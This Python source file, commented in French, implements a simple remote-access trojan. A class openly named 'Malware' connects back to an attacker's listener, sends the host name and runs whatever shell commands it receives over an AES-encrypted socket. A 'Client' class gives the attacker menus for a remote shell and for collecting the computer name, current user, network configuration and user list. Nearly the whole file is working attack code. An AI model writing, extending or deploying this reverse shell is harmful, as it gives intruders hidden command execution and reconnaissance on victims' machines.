import socket
import os
import sys
import time
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode
"""
Classe contenant les variables communes entre client et serveur
"""


class Machine:
    def __init__(self):
        self.server_addr = ("localhost", 60000)
        try:
            self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print("Socket cannot be created!")
        self.language = "utf-8"
        self.buffsize = 4096
        self.key = b'AcVfgTjpKumnVftH'


"""
Classe contenant les fonctions pour la machine infectée
"""


class Malware(Machine):
    def __init__(self):
        super().__init__()

    def start(self):
        time.sleep(2)
        try:
            print("try to co ....")
            self.my_socket.connect(self.server_addr)
            self.send(os.environ["COMPUTERNAME"])
        except socket.error:
            self.start()
        except TimeoutError:
            self.start()

    def send(self, message):
        send_b = message.encode(self.language)
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        encrypted = b64encode(iv + cipher.encrypt(send_b))
        self.my_socket.send(encrypted)

    def receive(self):
        try:
            enc = self.my_socket.recv(self.buffsize).decode(self.language)
            enc = b64decode(enc)
            iv = enc[:16]
            cipher = AES.new(self.key, AES.MODE_CFB, iv)
            return cipher.decrypt(enc[16:]).decode(self.language)
        except ConnectionResetError:
            self.quit()

    def quit(self):
        time.sleep(3)
        self.my_socket.close()

    def rev_shell(self, cmd):
        var = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out_byte = var.stdout.read() + var.stderr.read()
        out_str = out_byte.decode("utf-8", errors="replace")
        self.send(out_str)


"""
Classe contenant les fonction pour l'attaquant
"""


class Client(Machine):
    def __init__(self):
        super().__init__()

    def start(self):
        try:
            self.my_socket.bind(self.server_addr)
            self.my_socket.listen()
        except socket.error:
            print("Socket cant be binded!")
            self.quit_error()

    def conn(self):
        global distant_socket, addr, hostname
        distant_socket, addr = self.my_socket.accept()
        print("Connection accepted for :", addr)
        hostname = self.receive()
        print("The malware has infected the machine named " + str(hostname) + "\n")

    def send(self, command):
        try:
            send_b = command.encode(self.language)
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CFB, iv)
            encrypted = b64encode(iv + cipher.encrypt(send_b))
            distant_socket.send(encrypted)
        except ConnectionResetError:
            print("Connection lost with the infected machine")
            self.quit_error()

    def receive(self):
        enc = distant_socket.recv(self.buffsize).decode(self.language)
        enc = b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        return cipher.decrypt(enc[16:]).decode(self.language)

    def quit(self):
        print("Shutting down in 3 seconds")
        time.sleep(3)
        distant_socket.close()
        self.my_socket.close()
        sys.exit()

    def quit_error(self):
        print("Closing this session in 3 seconds.")
        time.sleep(1)
        print("... 2")
        time.sleep(1)
        print(".. 1")
        time.sleep(1)
        self.my_socket.close()
        sys.exit()

    def main_menu(self):
        print("                   _                                   \n",
              "      /\\/\\   __ _(_)_ __     /\\/\\   ___ _ __  _   _ \n",
              "     /    \\ / _` | | \'_ \\   /    \\ / _ \\ \'_ \\| | | |\n",
              "    / /\\/\\ \\ (_| | | | | | / /\\/\\ \\  __/ | | | |_| |\n",
              "    \\/    \\/\\__,_|_|_| |_| \\/    \\/\\___|_| |_|\\__,_|\n",
              "                                                    \n")
        print("Press 1 to access the remote shell")
        print("Press 2 to get informations (For windows target only)")
        print("Press 0 to quit")
        choice = input()
        return choice

    def choice_information(self, choice2):
        while choice2 != "0" and choice2 != "5" and choice2 is not None:
            if choice2 == "1":
                self.send("computer")
                print("\nComputer name : ", end="")
                print(self.receive())
            elif choice2 == "2":
                self.send("current")
                print("\nCurrent user : ", end="")
                print(self.receive())
            elif choice2 == "3":
                self.send("network")
                print(self.receive())
            elif choice2 == "4":
                self.send("users")
                print(self.receive())
            else:
                print("Enter a valid value!\n")

            choice2 = self.display_choice()

        if choice2 == "5":
            self.send("menu")
        else:
            self.send("quit")
            self.quit()

    def info_arg(self, argument):
        self.send(argument)
        print(self.receive())
        self.send("quit")
        self.quit()

    def display_choice(self):
        print("   _____        __                                 \n",
              "  \\_   \\_ __  / _| ___     /\\/\\   ___ _ __  _   _ \n",
              "   / /\\/ \'_ \\| |_ / _ \\   /    \\ / _ \\ \'_ \\| | | |\n",
              "/\\/ /_ | | | |  _| (_) | / /\\/\\ \\  __/ | | | |_| |\n",
              "\\____/ |_| |_|_|  \\___/  \\/    \\/\\___|_| |_|\\__,_|\n")
        print("Press 1 to get the infected computer name")
        print("Press 2 to see who is the current user")
        print("Press 3 to get the network configuration")
        print("Press 4 to get the list of users")
        print("Press 5 to return to the main menu")
        print("Press 0 to quit")
        return input()
    
